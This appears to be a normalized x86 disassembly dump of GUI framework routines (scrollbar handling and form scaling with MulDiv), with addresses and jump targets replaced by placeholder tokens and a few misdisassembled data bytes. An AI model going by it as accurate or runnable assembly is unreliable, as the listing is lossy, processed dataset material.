push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44bf08
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44bf08
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_44c4ec
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b8e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_44c370
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_44bf08
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_44c70c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_437614
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44bb88
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44bb88
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_44c784
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403164
mov eax [ esi + 0x20c ]
call sub_403164
mov edx ebx
and dl 0xfc
mov eax esi
call sub_437738
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_44c7d0
push ebx
mov ebx eax
mov eax ebx
call sub_4388a0
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_44c9e8
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40bc9c
test al al
jne r-xdata
mov eax ebx
call sub_43b8e8
push eax
call sub_426a08
sub_44c810
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44c968
mov ecx edi
mov edx esi
mov eax ebx
call sub_437fe8
pop edi
pop esi
pop ebx
retn
sub_44c850
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44c958
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_434b10
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_44be20
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_438618
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_44c370
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4385dc
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4385dc
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_4169bc
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43487c
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c95f
mov eax [ ebp - 0x10 ]
call sub_403164
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44bc68
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_416b18
xor ecx ecx
mov edx 0xb03e
call sub_4362b4
inc ebx
dec esi
jne r-xdata
sub_44c98c
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_44c4c0
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_44c4c0
mov eax ebx
call sub_44c968
jmp r-xdata
sub_44c9e8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43bbec
test al al
je r-xdata
xor eax eax
push ebp
push sub_44cad3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_44bf88
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44bf88
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_44c5f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_44c5f4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_44c5f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_44c5f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_44c5f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_44c5f4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_44caf8
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_434c24
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_434c50
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_434c24
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_434c50
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_434b10
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_44c370
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_434b10
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_434b54
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_44c370
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_434b10
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_44c370
mov eax ebx
call sub_434b10
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_434b54
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_434b54
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_44c370
mov eax ebx
call sub_434b54
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_44cc4c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_44c370
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_44c370
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_44c4c0
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_44c4c0
sub_44ccf0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44cc4c
mov ecx edi
mov edx esi
mov eax ebx
call sub_43b3f4
pop edi
pop esi
pop ebx
retn
sub_44cd18
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_44cd82
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_439ed4
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cd89
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_44cd89
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_44cdc1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44c968
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cdc8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_44cdc8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c9e8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_44ce3c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_434b54
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_424db4
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_434b10
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_424db4
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_41570c
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_437954
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44ceac
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44cf0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4032f0
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43ac64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cf14
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_44cf3c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44d0a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_44d080
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4030ac
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403470
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d087
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_44d048
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_4168d8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4030b4
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
call sub_4038d8
sub_44d0c8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403360
and [ ebx + 0x2f4 ] 0xdf
sub_44d100
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44c70c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_43487c
xor edx edx
mov eax ebx
call sub_4348a0
mov edx 0x140
mov eax ebx
call sub_4348c8
mov edx 0xf0
mov eax ebx
call sub_4348ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_424348
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_44da1c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fe10
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_433ce8
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4030ac
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_44dd80
xor edx edx
mov eax ebx
call sub_4352d0
xor edx edx
mov eax ebx
call sub_435238
mov dl 0x1
mov eax ebx
call sub_43ba28
mov edx ebx
mov eax [ rw-data ]
call sub_4523e4
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_44d279
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_41c758
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_416c5c
xor edx edx
mov eax ebx
call sub_4196dc
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_45128c
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_44d2e4
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034d8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_44d3ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44fc08
mov eax [ ebp - 0x4 ]
call sub_43bbec
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45241c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403164
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403164
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40cd4c
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c784
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d3b5
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_44d3c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_4035ec#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44dd80
sub_44d40e
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403360
test al al
jne r-xdata
call sub_403954
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403900
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44dd80
sub_44d444
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push j_sub_4035ec#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_44d4a4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4371bc
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403360
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44f74c
sub_44d4e0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4345dc
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_4169bc
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_44eb44
mov edx esi
mov eax ebp
call sub_416c5c
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_44eb1c
mov edx esi
mov eax edi
call sub_44eb44
jmp r-xdata
xor edx edx
mov eax edi
call sub_44eaf8
sub_44d5ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_438180
xor edx edx
push ebp
push sub_44d842
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4378dc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_434b28
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_434b6c
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_44d974
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_4362b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d849
mov eax [ ebp - 0x4 ]
call sub_438188
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44cc4c
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43b3ac
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44cc4c
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43b3ac
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41f6d4
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_41f6dc
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_44d851
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_438c28
push 0x0
push 0x0
push ebx
push sub_44d958
mov cl [ ebx + 0x5e ]
xor cl 0x1
